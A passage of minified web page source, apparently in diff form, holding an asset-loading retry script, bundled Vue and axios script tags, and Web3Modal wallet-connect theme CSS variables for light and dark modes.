l=s.target,u=s.tagName,d=s.url,m=s.rule,y=s.ruleIndex;if("undefined"==typeof window||!Object.keys(window.__RB_ASYNC_CHUNKS__||{}).some((function(e){return-1!==d.indexOf(e)}))){var f,g,p,b,v,h=e(d,m),E=Number(l.dataset.rbRetryTimes)||0;if(E===m.max)return void("function"==typeof m.onFail&&m.onFail({times:E,domain:h,url:d,tagName:u,isAsyncChunk:!1}));var w=(g=m.domain,p=e(h,m),-1===(b=g.indexOf(p))?p:g[(b+1)%g.length]),L=null!=(c=l.dataset.rbOriginalQuery)?c:(v=d.split("?")[1])?"?".concat(v.split("#")[0]):"",S=!!l.dataset.rbAsync||l.async||l.defer,T={url:d.replace(h,w).replace(n,"")+(f=E+1,!0===m.addQuery?""!==L?"".concat(L,"&retry=").concat(f):"?retry=".concat(f):"function"==typeof m.addQuery?m.addQuery({times:f,originalQuery:L}):""),times:E+1,originalQuery:L,ruleIndex:y,crossOrigin:m.crossOrigin,isAsync:S},_=function(e,n){var r=!0===n.crossOrigin?"anonymous":n.crossOrigin,a=r?'crossorigin="'.concat(r,'"'):"",i=n.times?'data-rb-retry-times="'.concat(n.times,'"'):"",o=n.originalQuery?'data-rb-original-query="'.concat(n.originalQuery,'"'):"",c=n.ruleIndex>=0?'data-rb-rule-i="'.concat(n.ruleIndex,'"'):"",s=n.isAsync?"data-rb-async":"";if(t(e,HTMLScriptElement)){var l=document.createElement("script");return l.src=n.url,r&&(l.crossOrigin=r),n.times&&(l.dataset.rbRetryTimes=n.times+""),n.isAsync&&(l.dataset.rbAsync=""),void 0!==n.originalQuery&&(l.dataset.rbOriginalQuery=n.originalQuery),n.ruleIndex>=0&&(l.dataset.rbRuleI=n.ruleIndex+""),{element:l,str:'<script src="'.concat(n.url,'" ').concat(a," ").concat(i," ").concat(s," ").concat(c," ").concat(o,">")+"<\/script>"}}if(t(e,HTMLLinkElement)){var u=document.createElement("link");return u.rel=e.rel||"stylesheet",e.as&&(u.as=e.as),u.href=n.url,r&&(u.crossOrigin=r),n.times&&(u.dataset.rbRetryTimes=n.times+""),void 0!==n.originalQuery&&(u.dataset.rbOriginalQuery=n.originalQuery),{element:u,str:'<link rel="'.concat(u.rel,'" href="').concat(n.url,'" ').concat(a," ").concat(i," ").concat(u.as?'as="'.concat(u.as,'"'):""," ").concat(c," ").concat(o,"></link>")}}}(l,T),N={times:E,domain:h,url:d,tagName:u,isAsyncChunk:!1};"function"==typeof m.onRetry&&m.onRetry(N);var O="function"==typeof m.delay?m.delay(N):m.delay;O>0?setTimeout((function(){i(l,_,T)}),O):i(l,_,T)}}}(o,r)}catch(e){console.error("retry error captured",e)}}),!0),document.addEventListener("load",(function(n){if(n&&t(n.target,Element))try{!function(n,t){var r=a(n,t);if(!1!==r){var i=r.target,o=r.tagName,c=r.url,s=r.rule,l=e(c,s),u=Number(i.dataset.rbRetryTimes)||0;0!==u&&"function"==typeof s.onSuccess&&s.onSuccess({times:u,domain:l,url:c,tagName:o,isAsyncChunk:!1})}}(o,n)}catch(e){console.error("load error captured",e)}}),!0))}catch(e){console.error("monitor error captured",e)}}()</script><meta charset="UTF-8"><script defer="defer" src="/static/js/lib-axios.168e1606.js"></script><script defer="defer" src="/static/js/lib-vue.abf8d1ba.js"></script><script defer="defer" src="/static/js/lib-router.248282cd.js"></script><script defer="defer" src="/static/js/8359.ebba86ef.js"></script><script defer="defer" src="/static/js/index.847389f3.js"></script><link href="/static/css/index.2697f303.css" rel="stylesheet"><style>
+      @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+      @keyframes w3m-shake {
+        0% {
+          transform: scale(1) rotate(0deg);
+        }
+        20% {
+          transform: scale(1) rotate(-1deg);
+        }
+        40% {
+          transform: scale(1) rotate(1.5deg);
+        }
+        60% {
+          transform: scale(1) rotate(-1.5deg);
+        }
+        80% {
+          transform: scale(1) rotate(1deg);
+        }
+        100% {
+          transform: scale(1) rotate(0deg);
+        }
+      }
+      @keyframes w3m-iframe-fade-out {
+        0% {
+          opacity: 1;
+        }
+        100% {
+          opacity: 0;
+        }
+      }
+      @keyframes w3m-iframe-zoom-in {
+        0% {
+          transform: translateY(50px);
+          opacity: 0;
+        }
+        100% {
+          transform: translateY(0px);
+          opacity: 1;
+        }
+      }
+      @keyframes w3m-iframe-zoom-in-mobile {
+        0% {
+          transform: scale(0.95);
+          opacity: 0;
+        }
+        100% {
+          transform: scale(1);
+          opacity: 1;
+        }
+      }
+      :root {
+        --w3m-modal-width: 360px;
+        --w3m-color-mix-strength: 0%;
+        --w3m-font-family: Inter;
+        --w3m-font-size-master: 10px;
+        --w3m-border-radius-master: 4px;
+        --w3m-z-index: 100;
+
+        --wui-font-family: var(--w3m-font-family);
+
+        --wui-font-size-mini: calc(var(--w3m-font-size-master) * 0.8);
+        --wui-font-size-micro: var(--w3m-font-size-master);
+        --wui-font-size-tiny: calc(var(--w3m-font-size-master) * 1.2);
+        --wui-font-size-small: calc(var(--w3m-font-size-master) * 1.4);
+        --wui-font-size-paragraph: calc(var(--w3m-font-size-master) * 1.6);
+        --wui-font-size-medium: calc(var(--w3m-font-size-master) * 1.8);
+        --wui-font-size-large: calc(var(--w3m-font-size-master) * 2);
+        --wui-font-size-title-6: calc(var(--w3m-font-size-master) * 2.2);
+        --wui-font-size-medium-title: calc(var(--w3m-font-size-master) * 2.4);
+        --wui-font-size-2xl: calc(var(--w3m-font-size-master) * 4);
+
+        --wui-border-radius-5xs: var(--w3m-border-radius-master);
+        --wui-border-radius-4xs: calc(var(--w3m-border-radius-master) * 1.5);
+        --wui-border-radius-3xs: calc(var(--w3m-border-radius-master) * 2);
+        --wui-border-radius-xxs: calc(var(--w3m-border-radius-master) * 3);
+        --wui-border-radius-xs: calc(var(--w3m-border-radius-master) * 4);
+        --wui-border-radius-s: calc(var(--w3m-border-radius-master) * 5);
+        --wui-border-radius-m: calc(var(--w3m-border-radius-master) * 7);
+        --wui-border-radius-l: calc(var(--w3m-border-radius-master) * 9);
+        --wui-border-radius-3xl: calc(var(--w3m-border-radius-master) * 20);
+
+        --wui-font-weight-light: 400;
+        --wui-font-weight-regular: 500;
+        --wui-font-weight-medium: 600;
+        --wui-font-weight-bold: 700;
+
+        --wui-letter-spacing-2xl: -1.6px;
+        --wui-letter-spacing-medium-title: -0.96px;
+        --wui-letter-spacing-title-6: -0.88px;
+        --wui-letter-spacing-large: -0.8px;
+        --wui-letter-spacing-medium: -0.72px;
+        --wui-letter-spacing-paragraph: -0.64px;
+        --wui-letter-spacing-small: -0.56px;
+        --wui-letter-spacing-tiny: -0.48px;
+        --wui-letter-spacing-micro: -0.2px;
+        --wui-letter-spacing-mini: -0.16px;
+
+        --wui-spacing-0: 0px;
+        --wui-spacing-4xs: 2px;
+        --wui-spacing-3xs: 4px;
+        --wui-spacing-xxs: 6px;
+        --wui-spacing-2xs: 7px;
+        --wui-spacing-xs: 8px;
+        --wui-spacing-1xs: 10px;
+        --wui-spacing-s: 12px;
+        --wui-spacing-m: 14px;
+        --wui-spacing-l: 16px;
+        --wui-spacing-2l: 18px;
+        --wui-spacing-xl: 20px;
+        --wui-spacing-xxl: 24px;
+        --wui-spacing-2xl: 32px;
+        --wui-spacing-3xl: 40px;
+        --wui-spacing-4xl: 90px;
+        --wui-spacing-5xl: 95px;
+
+        --wui-icon-box-size-xxs: 14px;
+        --wui-icon-box-size-xs: 20px;
+        --wui-icon-box-size-sm: 24px;
+        --wui-icon-box-size-md: 32px;
+        --wui-icon-box-size-mdl: 36px;
+        --wui-icon-box-size-lg: 40px;
+        --wui-icon-box-size-2lg: 48px;
+        --wui-icon-box-size-xl: 64px;
+
+        --wui-icon-size-inherit: inherit;
+        --wui-icon-size-xxs: 10px;
+        --wui-icon-size-xs: 12px;
+        --wui-icon-size-sm: 14px;
+        --wui-icon-size-md: 16px;
+        --wui-icon-size-mdl: 18px;
+        --wui-icon-size-lg: 20px;
+        --wui-icon-size-xl: 24px;
+        --wui-icon-size-xxl: 28px;
+
+        --wui-wallet-image-size-inherit: inherit;
+        --wui-wallet-image-size-sm: 40px;
+        --wui-wallet-image-size-md: 56px;
+        --wui-wallet-image-size-lg: 80px;
+
+        --wui-visual-size-size-inherit: inherit;
+        --wui-visual-size-sm: 40px;
+        --wui-visual-size-md: 55px;
+        --wui-visual-size-lg: 80px;
+
+        --wui-box-size-md: 100px;
+        --wui-box-size-lg: 120px;
+
+        --wui-ease-out-power-2: cubic-bezier(0, 0, 0.22, 1);
+        --wui-ease-out-power-1: cubic-bezier(0, 0, 0.55, 1);
+
+        --wui-ease-in-power-3: cubic-bezier(0.66, 0, 1, 1);
+        --wui-ease-in-power-2: cubic-bezier(0.45, 0, 1, 1);
+        --wui-ease-in-power-1: cubic-bezier(0.3, 0, 1, 1);
+
+        --wui-ease-inout-power-1: cubic-bezier(0.45, 0, 0.55, 1);
+
+        --wui-duration-lg: 200ms;
+        --wui-duration-md: 125ms;
+        --wui-duration-sm: 75ms;
+
+        --wui-path-network-sm: path(
+          'M15.4 2.1a5.21 5.21 0 0 1 5.2 0l11.61 6.7a5.21 5.21 0 0 1 2.61 4.52v13.4c0 1.87-1 3.59-2.6 4.52l-11.61 6.7c-1.62.93-3.6.93-5.22 0l-11.6-6.7a5.21 5.21 0 0 1-2.61-4.51v-13.4c0-1.87 1-3.6 2.6-4.52L15.4 2.1Z'
+        );
+
+        --wui-path-network-md: path(
+          'M43.4605 10.7248L28.0485 1.61089C25.5438 0.129705 22.4562 0.129705 19.9515 1.61088L4.53951 10.7248C2.03626 12.2051 0.5 14.9365 0.5 17.886V36.1139C0.5 39.0635 2.03626 41.7949 4.53951 43.2752L19.9515 52.3891C22.4562 53.8703 25.5438 53.8703 28.0485 52.3891L43.4605 43.2752C45.9637 41.7949 47.5 39.0635 47.5 36.114V17.8861C47.5 14.9365 45.9637 12.2051 43.4605 10.7248Z'
+        );
+
+        --wui-path-network-lg: path(
+          'M78.3244 18.926L50.1808 2.45078C45.7376 -0.150261 40.2624 -0.150262 35.8192 2.45078L7.6756 18.926C3.23322 21.5266 0.5 26.3301 0.5 31.5248V64.4752C0.5 69.6699 3.23322 74.4734 7.6756 77.074L35.8192 93.5492C40.2624 96.1503 45.7376 96.1503 50.1808 93.5492L78.3244 77.074C82.7668 74.4734 85.5 69.6699 85.5 64.4752V31.5248C85.5 26.3301 82.7668 21.5266 78.3244 18.926Z'
+        );
+
+        --wui-width-network-sm: 36px;
+        --wui-width-network-md: 48px;
+        --wui-width-network-lg: 86px;
+
+        --wui-height-network-sm: 40px;
+        --wui-height-network-md: 54px;
+        --wui-height-network-lg: 96px;
+
+        --wui-icon-size-network-xs: 12px;
+        --wui-icon-size-network-sm: 16px;
+        --wui-icon-size-network-md: 24px;
+        --wui-icon-size-network-lg: 42px;
+
+        --wui-color-inherit: inherit;
+
+        --wui-color-inverse-100: #fff;
+        --wui-color-inverse-000: #000;
+
+        --wui-cover: rgba(20, 20, 20, 0.8);
+
+        --wui-color-modal-bg: var(--wui-color-modal-bg-base);
+
+        --wui-color-accent-100: var(--wui-color-accent-base-100);
+        --wui-color-accent-090: var(--wui-color-accent-base-090);
+        --wui-color-accent-080: var(--wui-color-accent-base-080);
+
+        --wui-color-success-100: var(--wui-color-success-base-100);
+        --wui-color-success-125: var(--wui-color-success-base-125);
+
+        --wui-color-warning-100: var(--wui-color-warning-base-100);
+
+        --wui-color-error-100: var(--wui-color-error-base-100);
+        --wui-color-error-125: var(--wui-color-error-base-125);
+
+        --wui-color-blue-100: var(--wui-color-blue-base-100);
+        --wui-color-blue-90: var(--wui-color-blue-base-90);
+
+        --wui-icon-box-bg-error-100: var(--wui-icon-box-bg-error-base-100);
+        --wui-icon-box-bg-blue-100: var(--wui-icon-box-bg-blue-base-100);
+        --wui-icon-box-bg-success-100: var(--wui-icon-box-bg-success-base-100);
+        --wui-icon-box-bg-inverse-100: var(--wui-icon-box-bg-inverse-base-100);
+
+        --wui-all-wallets-bg-100: var(--wui-all-wallets-bg-100);
+
+        --wui-avatar-border: var(--wui-avatar-border-base);
+
+        --wui-thumbnail-border: var(--wui-thumbnail-border-base);
+
+        --wui-wallet-button-bg: var(--wui-wallet-button-bg-base);
+
+        --wui-box-shadow-blue: var(--wui-color-accent-glass-020);
+      }
+
+      @supports (background: color-mix(in srgb, white 50%, black)) {
+        :root {
+          --wui-color-modal-bg: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-modal-bg-base)
+          );
+
+          --wui-box-shadow-blue: color-mix(in srgb, var(--wui-color-accent-100) 20%, transparent);
+
+          --wui-color-accent-100: color-mix(
+            in srgb,
+            var(--wui-color-accent-base-100) 100%,
+            transparent
+          );
+          --wui-color-accent-090: color-mix(
+            in srgb,
+            var(--wui-color-accent-base-100) 90%,
+            transparent
+          );
+          --wui-color-accent-080: color-mix(
+            in srgb,
+            var(--wui-color-accent-base-100) 80%,
+            transparent
+          );
+          --wui-color-accent-glass-090: color-mix(
+            in srgb,
+            var(--wui-color-accent-base-100) 90%,
+            transparent
+          );
+          --wui-color-accent-glass-080: color-mix(
+            in srgb,
+            var(--wui-color-accent-base-100) 80%,
+            transparent
+          );
+          --wui-color-accent-glass-020: color-mix(
+            in srgb,
+            var(--wui-color-accent-base-100) 20%,
+            transparent
+          );
+          --wui-color-accent-glass-015: color-mix(
+            in srgb,
+            var(--wui-color-accent-base-100) 15%,
+            transparent
+          );
+          --wui-color-accent-glass-010: color-mix(
+            in srgb,
+            var(--wui-color-accent-base-100) 10%,
+            transparent
+          );
+          --wui-color-accent-glass-005: color-mix(
+            in srgb,
+            var(--wui-color-accent-base-100) 5%,
+            transparent
+          );
+          --wui-color-accent-002: color-mix(
+            in srgb,
+            var(--wui-color-accent-base-100) 2%,
+            transparent
+          );
+
+          --wui-color-fg-100: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-fg-100)
+          );
+          --wui-color-fg-125: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-fg-125)
+          );
+          --wui-color-fg-150: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-fg-150)
+          );
+          --wui-color-fg-175: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-fg-175)
+          );
+          --wui-color-fg-200: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-fg-200)
+          );
+          --wui-color-fg-225: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-fg-225)
+          );
+          --wui-color-fg-250: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-fg-250)
+          );
+          --wui-color-fg-275: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-fg-275)
+          );
+          --wui-color-fg-300: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-fg-300)
+          );
+          --wui-color-fg-325: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-fg-325)
+          );
+          --wui-color-fg-350: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-fg-350)
+          );
+
+          --wui-color-bg-100: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-bg-100)
+          );
+          --wui-color-bg-125: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-bg-125)
+          );
+          --wui-color-bg-150: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-bg-150)
+          );
+          --wui-color-bg-175: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-bg-175)
+          );
+          --wui-color-bg-200: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-bg-200)
+          );
+          --wui-color-bg-225: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-bg-225)
+          );
+          --wui-color-bg-250: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-bg-250)
+          );
+          --wui-color-bg-275: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-bg-275)
+          );
+          --wui-color-bg-300: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-bg-300)
+          );
+          --wui-color-bg-325: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-bg-325)
+          );
+          --wui-color-bg-350: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-bg-350)
+          );
+
+          --wui-color-success-100: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-success-base-100)
+          );
+          --wui-color-success-125: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-success-base-125)
+          );
+
+          --wui-color-warning-100: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-warning-base-100)
+          );
+
+          --wui-color-error-100: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-error-base-100)
+          );
+          --wui-color-blue-100: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-blue-base-100)
+          );
+          --wui-color-blue-90: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-blue-base-90)
+          );
+          --wui-color-error-125: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-error-base-125)
+          );
+
+          --wui-icon-box-bg-error-100: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-icon-box-bg-error-base-100)
+          );
+          --wui-icon-box-bg-accent-100: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-icon-box-bg-blue-base-100)
+          );
+          --wui-icon-box-bg-success-100: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-icon-box-bg-success-base-100)
+          );
+          --wui-icon-box-bg-inverse-100: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-icon-box-bg-inverse-base-100)
+          );
+
+          --wui-all-wallets-bg-100: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-all-wallets-bg-100)
+          );
+
+          --wui-avatar-border: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-avatar-border-base)
+          );
+
+          --wui-thumbnail-border: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-thumbnail-border-base)
+          );
+
+          --wui-wallet-button-bg: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-wallet-button-bg-base)
+          );
+        }
+      }
+    </style><style media="enabled">
+      :root {
+        --w3m-color-mix: #000;
+        --w3m-accent: hsla(231, 100%, 70%, 1);
+        --w3m-default: #000;
+
+        --wui-color-modal-bg-base: #fff;
+        --wui-color-accent-base-100: var(--w3m-accent);
+
+        --wui-color-blueberry-100: hsla(231, 100%, 70%, 1);
+        --wui-color-blueberry-090: hsla(231, 97%, 72%, 1);
+        --wui-color-blueberry-080: hsla(231, 92%, 74%, 1);
+
+        --wui-color-fg-100: #141414;
+        --wui-color-fg-125: #2d3131;
+        --wui-color-fg-150: #474d4d;
+        --wui-color-fg-175: #636d6d;
+        --wui-color-fg-200: #798686;
+        --wui-color-fg-225: #828f8f;
+        --wui-color-fg-250: #8b9797;
+        --wui-color-fg-275: #95a0a0;
+        --wui-color-fg-300: #9ea9a9;
+        --wui-color-fg-325: #9a9a9a;
+        --wui-color-fg-350: #d0d0d0;
+
+        --wui-color-bg-100: #ffffff;
+        --wui-color-bg-125: #f5fafa;
+        --wui-color-bg-150: #f3f8f8;
+        --wui-color-bg-175: #eef4f4;
+        --wui-color-bg-200: #eaf1f1;
+        --wui-color-bg-225: #e5eded;
+        --wui-color-bg-250: #e1e9e9;
+        --wui-color-bg-275: #dce7e7;
+        --wui-color-bg-300: #d8e3e3;
+        --wui-color-bg-325: #f3f3f3;
+        --wui-color-bg-350: #202020;
+
+        --wui-color-success-base-100: #26b562;
+        --wui-color-success-base-125: #30a46b;
+
+        --wui-color-warning-base-100: #f3a13f;
+
+        --wui-color-error-base-100: #f05142;
+        --wui-color-error-base-125: #df4a34;
+
+        --wui-color-blue-base-100: rgba(102, 125, 255, 1);
+        --wui-color-blue-base-90: rgba(102, 125, 255, 0.9);
+
+        --wui-color-success-glass-001: rgba(38, 181, 98, 0.01);
+        --wui-color-success-glass-002: rgba(38, 181, 98, 0.02);
+        --wui-color-success-glass-005: rgba(38, 181, 98, 0.05);
+        --wui-color-success-glass-010: rgba(38, 181, 98, 0.1);
+        --wui-color-success-glass-015: rgba(38, 181, 98, 0.15);
+        --wui-color-success-glass-020: rgba(38, 181, 98, 0.2);
+        --wui-color-success-glass-025: rgba(38, 181, 98, 0.25);
+        --wui-color-success-glass-030: rgba(38, 181, 98, 0.3);
+        --wui-color-success-glass-060: rgba(38, 181, 98, 0.6);
+        --wui-color-success-glass-080: rgba(38, 181, 98, 0.8);
+
+        --wui-color-success-glass-reown-020: rgba(48, 164, 107, 0.2);
+
+        --wui-color-warning-glass-reown-020: rgba(243, 161, 63, 0.2);
+
+        --wui-color-error-glass-001: rgba(240, 81, 66, 0.01);
+        --wui-color-error-glass-002: rgba(240, 81, 66, 0.02);
+        --wui-color-error-glass-005: rgba(240, 81, 66, 0.05);
+        --wui-color-error-glass-010: rgba(240, 81, 66, 0.1);
+        --wui-color-error-glass-015: rgba(240, 81, 66, 0.15);
+        --wui-color-error-glass-020: rgba(240, 81, 66, 0.2);
+        --wui-color-error-glass-025: rgba(240, 81, 66, 0.25);
+        --wui-color-error-glass-030: rgba(240, 81, 66, 0.3);
+        --wui-color-error-glass-060: rgba(240, 81, 66, 0.6);
+        --wui-color-error-glass-080: rgba(240, 81, 66, 0.8);
+
+        --wui-color-error-glass-reown-020: rgba(223, 74, 52, 0.2);
+
+        --wui-icon-box-bg-error-base-100: #f4dfdd;
+        --wui-icon-box-bg-blue-base-100: #d9ecfb;
+        --wui-icon-box-bg-success-base-100: #daf0e4;
+        --wui-icon-box-bg-inverse-base-100: #dcecfc;
+
+        --wui-all-wallets-bg-100: #e8f1fa;
+
+        --wui-avatar-border-base: #f3f4f4;
+
+        --wui-thumbnail-border-base: #eaefef;
+
+        --wui-wallet-button-bg-base: var(--wui-color-bg-125);
+
+        --wui-color-gray-glass-001: rgba(0, 0, 0, 0.01);
+        --wui-color-gray-glass-002: rgba(0, 0, 0, 0.02);
+        --wui-color-gray-glass-005: rgba(0, 0, 0, 0.05);
+        --wui-color-gray-glass-010: rgba(0, 0, 0, 0.1);
+        --wui-color-gray-glass-015: rgba(0, 0, 0, 0.15);
+        --wui-color-gray-glass-020: rgba(0, 0, 0, 0.2);
+        --wui-color-gray-glass-025: rgba(0, 0, 0, 0.25);
+        --wui-color-gray-glass-030: rgba(0, 0, 0, 0.3);
+        --wui-color-gray-glass-060: rgba(0, 0, 0, 0.6);
+        --wui-color-gray-glass-080: rgba(0, 0, 0, 0.8);
+        --wui-color-gray-glass-090: rgba(0, 0, 0, 0.9);
+
+        --wui-color-dark-glass-100: rgba(233, 233, 233, 1);
+
+        --w3m-card-embedded-shadow-color: rgb(224 225 233 / 25%);
+      }
+    </style><style>
+      :root {
+        --w3m-color-mix: #fff;
+        --w3m-accent: hsla(230, 100%, 67%, 1);
+        --w3m-default: #fff;
+
+        --wui-color-modal-bg-base: #121313;
+        --wui-color-accent-base-100: var(--w3m-accent);
+
+        --wui-color-blueberry-100: hsla(230, 100%, 67%, 1);
+        --wui-color-blueberry-090: hsla(231, 76%, 61%, 1);
+        --wui-color-blueberry-080: hsla(230, 59%, 55%, 1);
+        --wui-color-blueberry-050: hsla(231, 100%, 70%, 0.1);
+
+        --wui-color-fg-100: #e4e7e7;
+        --wui-color-fg-125: #d0d5d5;
+        --wui-color-fg-150: #a8b1b1;
+        --wui-color-fg-175: #a8b0b0;
+        --wui-color-fg-200: #949e9e;
+        --wui-color-fg-225: #868f8f;
+        --wui-color-fg-250: #788080;
+        --wui-color-fg-275: #788181;
+        --wui-color-fg-300: #6e7777;
+        --wui-color-fg-325: #9a9a9a;
+        --wui-color-fg-350: #363636;
+
+        --wui-color-bg-100: #141414;
+        --wui-color-bg-125: #191a1a;
+        --wui-color-bg-150: #1e1f1f;
+        --wui-color-bg-175: #222525;
+        --wui-color-bg-200: #272a2a;
+        --wui-color-bg-225: #2c3030;
+        --wui-color-bg-250: #313535;
+        --wui-color-bg-275: #363b3b;
+        --wui-color-bg-300: #3b4040;
+        --wui-color-bg-325: #252525;
+        --wui-color-bg-350: #ffffff;
+
+        --wui-color-success-base-100: #26d962;
+        --wui-color-success-base-125: #30a46b;
+
+        --wui-color-warning-base-100: #f3a13f;
+
+        --wui-color-error-base-100: #f25a67;
+        --wui-color-error-base-125: #df4a34;
+
+        --wui-color-blue-base-100: rgba(102, 125, 255, 1);
+        --wui-color-blue-base-90: rgba(102, 125, 255, 0.9);
+
+        --wui-color-success-glass-001: rgba(38, 217, 98, 0.01);
+        --wui-color-success-glass-002: rgba(38, 217, 98, 0.02);
+        --wui-color-success-glass-005: rgba(38, 217, 98, 0.05);
+        --wui-color-success-glass-010: rgba(38, 217, 98, 0.1);
+        --wui-color-success-glass-015: rgba(38, 217, 98, 0.15);
+        --wui-color-success-glass-020: rgba(38, 217, 98, 0.2);
+        --wui-color-success-glass-025: rgba(38, 217, 98, 0.25);
+        --wui-color-success-glass-030: rgba(38, 217, 98, 0.3);
+        --wui-color-success-glass-060: rgba(38, 217, 98, 0.6);
+        --wui-color-success-glass-080: rgba(38, 217, 98, 0.8);
+
+        --wui-color-success-glass-reown-020: rgba(48, 164, 107, 0.2);
+
+        --wui-color-warning-glass-reown-020: rgba(243, 161, 63, 0.2);
+
+        --wui-color-error-glass-001: rgba(242, 90, 103, 0.01);
+        --wui-color-error-glass-002: rgba(242, 90, 103, 0.02);
+        --wui-color-error-glass-005: rgba(242, 90, 103, 0.05);
+        --wui-color-error-glass-010: rgba(242, 90, 103, 0.1);
+        --wui-color-error-glass-015: rgba(242, 90, 103, 0.15);
+        --wui-color-error-glass-020: rgba(242, 90, 103, 0.2);
+        --wui-color-error-glass-025: rgba(242, 90, 103, 0.25);
+        --wui-color-error-glass-030: rgba(242, 90, 103, 0.3);
+        --wui-color-error-glass-060: rgba(242, 90, 103, 0.6);
+        --wui-color-error-glass-080: rgba(242, 90, 103, 0.8);
+
+        --wui-color-error-glass-reown-020: rgba(223, 74, 52, 0.2);
+
+        --wui-color-gray-glass-001: rgba(255, 255, 255, 0.01);
+        --wui-color-gray-glass-002: rgba(255, 255, 255, 0.02);
+        --wui-color-gray-glass-005: rgba(255, 255, 255, 0.05);
+        --wui-color-gray-glass-010: rgba(255, 255, 255, 0.1);
+        --wui-color-gray-glass-015: rgba(255, 255, 255, 0.15);
+        --wui-color-gray-glass-020: rgba(255, 255, 255, 0.2);
+        --wui-color-gray-glass-025: rgba(255, 255, 255, 0.25);
+        --wui-color-gray-glass-030: rgba(255, 255, 255, 0.3);
+        --wui-color-gray-glass-060: rgba(255, 255, 255, 0.6);
+        --wui-color-gray-glass-080: rgba(255, 255, 255, 0.8);
+        --wui-color-gray-glass-090: rgba(255, 255, 255, 0.9);
+
+        --wui-color-dark-glass-100: rgba(42, 42, 42, 1);
+
+        --wui-icon-box-bg-error-base-100: #3c2426;
+        --wui-icon-box-bg-blue-base-100: #20303f;
+        --wui-icon-box-bg-success-base-100: #1f3a28;
+        --wui-icon-box-bg-inverse-base-100: #243240;
+
+        --wui-all-wallets-bg-100: #222b35;
+
+        --wui-avatar-border-base: #252525;
+
+        --wui-thumbnail-border-base: #252525;
+
+        --wui-wallet-button-bg-base: var(--wui-color-bg-125);
+
+        --w3m-card-embedded-shadow-color: rgb(17 17 18 / 25%);
+      }
